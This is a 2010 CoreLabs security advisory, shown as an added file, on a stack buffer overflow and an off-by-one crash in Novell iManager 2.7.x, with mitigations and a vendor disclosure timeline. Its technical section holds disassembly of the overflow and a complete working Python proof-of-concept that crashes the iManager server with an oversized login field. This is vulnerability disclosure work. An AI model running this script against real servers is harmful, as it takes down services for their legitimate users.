@@ -1,0 +1,507 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+ 
+      Core Security Technologies - CoreLabs Advisory
+            http://corelabs.coresecurity.com/
+
+        Novell iManager Multiple Vulnerabilities
+
+
+
+1. *Advisory Information*
+
+Title: Novell iManager Multiple Vulnerabilities
+Advisory Id: CORE-2010-0316
+Advisory URL:
+[http://www.coresecurity.com/content/novell-imanager-buffer-overflow-off-by-one-vulnerabilities]
+Date published: 2010-06-23
+Date of last update: 2010-06-23
+Vendors contacted: Novell
+Release mode: User release
+
+
+
+2. *Vulnerability Information*
+
+Class: Stack-based buffer overflow [CWE-119], Off-by-one error [CWE-193]
+Impact: Code execution, Denial of service
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2010-1929, CVE-2010-1930
+Bugtraq ID: 40480, 40485
+
+
+
+3. *Vulnerability Description*
+
+Novell iManager is a Web-based administration console that provides
+customized secure access to network administration utilities and
+content from any location in the world. With iManager you can manage
+Novell Open Enterprise Server, Novell Identity Manager, Novell
+eDirectory and many other Novell and third-party services from a web
+browser. Novell iManager is prone to a stack-based buffer overflow
+vulnerability that can be exploited by authenticated users to execute
+arbitrary code, and to an off-by-one error that can be abused by
+remote, unauthenticated attackers to cause a Denial of Service to the
+application.
+
+
+4. *Vulnerable packages*
+
+   . Novell iManager 2.7
+   . Novell iManager 2.7.3
+   . Novell iManager 2.7.3 FTF2
+   . Older versions are probably affected too, but they were not checked.
+
+
+5. *Non-vulnerable packages*
+
+   . Novell iManager 2.7.3 ftf4
+   . Novell iManager 2.7.4
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+Novell has a planned release of iManager 2.7.4 in August 2010; this
+release should fix these issues. The Novell team notifies they will
+provide patches for the current vulnerable versions with the 2.7.3
+ftf4 release before August, but this release was not confirmed yet
+(see the timeline for more details). In the meantime, users can
+mitigate these flaws by applying these countermeasures:
+
+   1. For [CVE-2010-1929 | 40480], establish a Web Application
+Firewall rule for limiting the length of the parameters
+'EnteredClassID' and 'NewClassName' in POST requests to the URI
+'/nps/servlet/webacc/'.
+   2. For [CVE-2010-1930 | 40485], establish a Web Application
+Firewall rule for limiting the length of the parameter 'Tree' in POST
+requests to the URI '/nps/servlet/webacc/'.
+
+ Similar rules can also be established in the Apache webserver of the
+iManager installation in order to mitigate these flaws.
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon
+from Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+
+8.1. *Introduction*
+
+Novell iManager [1] is a Web-based administration console that
+provides customized secure access to network administration utilities
+and content from any location in the world. With iManager you can
+manage Novell Open Enterprise Server, Novell Identity Manager, Novell
+eDirectory and many other Novell and third-party services from a web
+browser. Novell iManager is prone to a stack-based buffer overflow
+vulnerability that can be exploited by authenticated users to execute
+arbitrary code, and to an off-by-one error that can be abused by
+remote, unauthenticated attackers to cause a Denial of Service to the
+application. These two vulnerabilities are described below.
+
+
+8.2. *Stack-based Buffer Overflow*
+
+[CVE-2010-1929 | 40480] Novell iManager provides a feature to create
+classes, under the 'Schema' menu. The class name is intended to have a
+maximum length of 32 characters. This limitation is enforced on the
+client side by setting a 'maxlength' property with a value of 32 in
+the proper form field, but no verification is performed on the server
+side to ensure that the user-defined class name is, at most, 32
+characters long. By tampering the POST request that sends the class
+name when creating a new class, an authenticated user can define an
+overly long class name that will cause a stack-based buffer overflow
+on the iManager web server, making it possible for the attacker to
+overwrite return addresses and Structured Exception Handlers, allowing
+the execution of arbitrary code with the privileges of the current
+user (in the case of iManager Workstation) or with SYSTEM privileges
+(in the case of iManager Server).
+
+On the server side, the creation of a new class is handled by the
+'jclient._Java_novell_jclient_JClient_defineClass () 20' function, in the
+'jclient.dll' module of the iManager Tomcat web server. This function
+in turn invokes a subroutine that copies the user-defined class name
+to a fixed-size buffer in the stack, without checking its length. The
+following disassembled code of the Novell iManager Tomcat web server
+illustrates the vulnerability.
+
+/-----
+[jvm.dll + 0x1055CC]
+
+6D9B55CC  |.  8B7D 18       MOV EDI,DWORD PTR
+SS:[EBP+18]                    ;  edi = destination buffer in the stack
+6D9B55CF  |.  83E1 3F       AND ECX,3F
+6D9B55D2  |.  D3E0          SHL EAX,CL
+6D9B55D4  |.  8D7472 0C     LEA ESI,DWORD PTR
+DS:[EDX+ESI*2+C]               ;  esi = pointer to class name
+6D9B55D8  |.  8BC8          MOV
+ECX,EAX                                      ;  ecx = length of class name
+6D9B55DA  |.  8BD1          MOV EDX,ECX
+6D9B55DC  |.  C1E9 02       SHR ECX,2
+6D9B55DF  |.  F3:A5         REP MOVS DWORD PTR ES:[EDI],DWORD PTR
+DS:[ESI]   ;  *BUFFER OVERFLOW*
+
+- -----/
+
+
+
+8.3. *Off By One Error (DoS)*
+
+[CVE-2010-1930 | 40485] There is an off-by-one error in the code that
+handles the login process that can be abused by remote,
+unauthenticated users to crash the iManager web server, thus denying
+the service to legitimate users.
+
+The three input fields in the login page of iManager have defined a
+'maxlength' property with a value of 256 to limit the number of
+characters that can be entered in each field. However, if a login
+request is sent to the web server having a 'TREE' field with a length
+of 256 characters, the iManager Tomcat web server will crash,
+rendering the application unavailable.
+
+The following Python script is a proof of concept of the
+vulnerability, and will crash the Novell iManager instance specified
+via command-line arguments:
+
+/-----
+#Usage: $ python poc.py <iManager_IP> <iManager_Port>
+#E.g:     $ python poc.py 192.168.0.1 48080
+
+import socket
+import sys
+import time
+import httplib
+
+
+def server_uses_SSL(host, port):
+    #Try to determine if the server is using HTTP over SSL or not.
+    headers = { 'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0;
+Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727;
+.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
+               
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-us,en;q=0.5',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Connection':'close'}
+
+    using_ssl = True
+    conn = httplib.HTTPSConnection(host, port)
+    try:
+        conn.request('GET', '/nps/servlet/webacc', headers=headers)
+        response = conn.getresponse()
+    except socket.sslerror:
+        using_ssl = False
+    finally:
+        conn.close()
+    return using_ssl
+
+
+def post_urlencoded_data(host, port, selector, body, use_ssl,
+get_resp=True):
+
+    headers = { 'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0;
+Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727;
+.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
+               
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-us,en;q=0.5',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Referer': 'http://%s:%s%s' % (host, port,
+'/nps/servlet/webacc'),
+                'Content-Type':'application/x-www-form-urlencoded',
+                'Content-Length': str(len(body)),
+                'Connection':'close'}
+
+    if use_ssl:
+        conn = httplib.HTTPSConnection(host, port)
+    else:
+        conn = httplib.HTTPConnection(host, port)
+    conn.request('POST', selector, body, headers)
+
+    html = ''
+    #This flag allows me to avoid keeping waiting for a server
+response in the last step, when the webserver is crashed
+    if get_resp:
+        response = conn.getresponse()
+        html = response.read()
+    conn.close()
+    return html
+
+
+def getPostParameters():
+    params  = 'rank=primary&DoLogin=true&forceMaster=false'
+    params +=
+'&username=admin&password=mipass&tree=%s&Entrada.x=27&Entrada.y=13' %
+('A' * 256)
+    return params
+
+
+def main():
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+
+    #Determine if the server uses plain HTTP (iManager Workstation) or
+HTTPS (iManager Server)
+    uses_ssl = server_uses_SSL(host, port)
+    if uses_ssl:
+        print '(+) The server uses HTTP over SSL. Guessed target:
+iManager Server.'
+    else:
+        print '(+) The server uses plain HTTP. Guessed target:
+iManager Workstation.'
+
+    print '(+) Sending login request with 256-character long TREE
+field...'
+    post_urlencoded_data(host, port, '/nps/servlet/webacc',
+getPostParameters(), uses_ssl, False)
+    print '(+) Malicious request successfully sent.'
+
+    #Wait 10 seconds and try to connect again to iManager, to check if
+it's down
+    print '(+) Waiting 10 seconds before trying to reconnect to
+iManager...'
+    time.sleep(10)
+
+    try:
+        print '(+) Trying to reconnect...'
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.close()
+        print '(!) Something went wrong. Novell iManager is still alive.'
+    except socket.error:
+        print '(*) Attack successful. Novell iManager is down.'
+
+if __name__ == '__main__':
+    main()
+
+- -----/
+
+
+
+9. *Report Timeline*
+
+. 2010-04-08:
+Core Security Technologies notifies the iManager team of the
+vulnerability and announces its initial plan to publish the advisory
+on May 3rd, 2010.
+
+. 2010-04-09:
+The iManager team asks Core for a technical description of the
+vulnerability.
+
+. 2010-04-09:
+Technical details are sent to iManager team by Core. No reply received.
+
+. 2010-04-14:
+Technical details are re-sent to iManager team. Core asks the vendor
+to confirm the reception of the technical report. No reply received.
+
+. 2010-04-20:
+Core asks the vendor to confirm the reception of the technical report.
+No reply received.
+
+. 2010-04-29:
+Core notifies the lack of an answer from the iManager team in the last
+3 weeks. Core also requests a status update and notifies the advisory
+publication has been re-scheduled to May 17th.
+
+. 2010-04-30:
+iManager team notifies the Service Request 10614363428 has been opened
+to track this issue.
+
+. 2010-04-30:
+iManager team notifies the PoC script included in the advisory against
+iManager 2.7.3 has been unable to cause iManager to crash.
+
+. 2010-04-30:
+Core notifies the original PoC was tested against the Workstation
+version of Novell iManager (it uses plain HTTP). The Server version
+(used by vendor) uses HTTPS. Core sends a new PoC which was tested on
+both the Workstation and Server versions of iManger.
+
+. 2010-05-07:
+iManager team notifies they were able to duplicate the PoC against the
+Windows version of iManager but, they were unable to duplicate it
+against Linux versions. The vendor also notifies they have a planned
+release of iManager 2.7.4 in August and asks Core if that timeframe is
+acceptable.
+
+. 2010-05-13:
+Core asks the vendor if they are going to release a fix/patch for the
+already vulnerable users and recommends doing so before the next
+release of iManager, Aug 2010. No reply received.
+
+. 2010-05-17:
+Core asks for a status update about this issue. Core also notifies
+Novell mentioned their team had been able to reproduce the PoC of the
+DoS vulnerability but Core reported 2 vulnerabilities:
+
+   1. Remote Denial of Service,
+   2. Stack-based buffer overflow (exploitable when a user sends a
+long class name).
+
+ There was no information reported about the 2nd vulnerability.
+
+. 2010-05-18:
+iManager team asks when Core is going to disclose the vulnerabilities
+and if that time is flexible.
+
+. 2010-05-20:
+Core notifies the proposed release date was already missed
+(2010-May-17), and the advisory is re-scheduled to May 31st. Core also
+notifies this release date is flexible but it depends on Novell
+timeline and further actions. In order to change this date Core asks
+for the information required in previous emails:
+
+   1. Core asks if iManager team could reproduce both vulnerabilities.
+   2. Core asks if they are going to release patches/fixes for both
+vulnerabilities before the release of the new version of iManager
+(iManager 2.7.4 scheduled for August 2010)
+   3. Core asks if they are going to release a security bulletin for
+their customers.
+
+ Core also notifies that if the iManager team does not mean to release
+patches and/or a security bulletin then, there is not a good reason to
+postpone the advisory publication till Aug 2010.
+
+. 2010-05-27:
+Core notifies the advisory is going to be released next Monday 31st
+and that this date can be re-scheduled to a near future if iManager
+team sends the information requested in previous emails. Core asks
+Novell to re-establish the contact ASAP in order to coordinate the
+advisory publication.
+
+. 2010-06-02:
+Paula Gephart from the iManager team notifies she was out of town and
+the email's vacation rule has not worked for some reason. The iManager
+team also notifies that they would like to coordinate a release and
+they will re-establish the contact as soon as they can find an
+acceptable release mechanism.
+
+. 2010-06-02:
+Core notifies that, given the 2nd publication deadline for the
+advisory has already passed and the lack of an answer from the
+iManager team to the questions asked in the email sent in
+[2010-05-20], it is best (according to the Core's assessment on how to
+help users to reduce risk) to inform the vulnerable users about their
+risk and provide whatever mitigation or workarounds than to postpone
+disclosure to an uncertain future date. Core also notifies the
+advisory has already entered within the publication system and it
+would be hard to stop it, but it can be done if the iManager team
+provides the answers requested in the previous emails. Core notifies
+that will be waiting for this information until the end of the day and
+this deadline should be considered as final. No reply received.
+
+. 2010-06-02:
+The advisory CORE-2010-0316 is published.
+
+. 2010-06-02:
+The iManager team notifies both bugs have been reproduced and they are
+going to develop fixes for both issues. The iMananger team also
+notifies it has not decided if they are going to issue patches for the
+vulnerable versions of iManager currently in use or will just roll out
+the fixes in the upcoming release of a new iManager version.
+
+. 2010-06-02:
+Core removes the advisory from its website and notifies that it was
+published for about 20 minutes. Core also notifies there will be a
+meeting of the Core Advisories Team in order to evaluate this case
+tomorrow (Thursday 3th) 19.30 GMT. If the iManager team does not mean
+to release patches then, there is not a good reason to postpone the
+advisory publication till Aug 2010.
+
+. 2010-06-03:
+The iManager team notifies the plan to release a 2.7.3 ftf4 to fix
+these 2 issues and another issue. iManager 2.7.3 ftf4 would be
+released before August, but there is no date yet.
+
+. 2010-06-03:
+Core agrees to postpone the advisory publication waiting for the 2.7.3
+ftf4 release. The advisory is re-scheduled for publication to the
+Monday 21th June, 2010. Core notifies this date can be moved if the
+iManager team need it, but the iManager team should provide a clear
+report about the progress of the fixing process in order to request
+moving the release date.
+
+. 2010-06-15:
+Core requests a status update to the iManager team.
+
+. 2010-06-17:
+Core requests a status update to the iManager team and notifies the
+advisory will be released next Monday as planned.
+
+. 2010-06-18:
+The iManager team notifies they are waiting on a response from another
+Novell product that ships with iManager, to make sure they will also
+be able to consume the new version of iManager and release before
+August. The iManager team also notifies they will contact Core with
+the timeline today.
+
+. 2010-06-23:
+The advisory CORE-2010-0316 is published.
+
+
+
+10. *References*
+
+[1] Novell iManager:
+[http://www.novell.com/products/consoles/imanager/overview.html].
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is
+charged with anticipating the future needs and requirements for
+information security technologies. We conduct our research in several
+important areas of computer security including system vulnerabilities,
+cyber attack planning and simulation, source code auditing, and
+cryptography. Our results include problem formalization,
+identification of vulnerabilities, novel solutions and prototypes for
+new technologies. CoreLabs regularly publishes security advisories,
+technical papers, project information and shared software tools for
+public use at: [http://www.coresecurity.com/corelabs].
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources
+are exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and
+software security auditing. Based in Boston, MA and Buenos Aires,
+Argentina, Core Security Technologies can be reached at 617-399-6980
+or on the Web at [http://www.coresecurity.com].
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2010 Core Security
+Technologies and (c) 2010 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper
+credit is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+[http://www.coresecurity.com/files/attachments/core_security_advisories.asc].
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+ 
+iEYEARECAAYFAkwifQUACgkQyNibggitWa1meQCfX8hLENduIFbfOtEAh08CDEUb
+rJwAoIU+v/I4bPYp5f37zN5R/KKJ5ffB
+=OoGO
+-----END PGP SIGNATURE-----
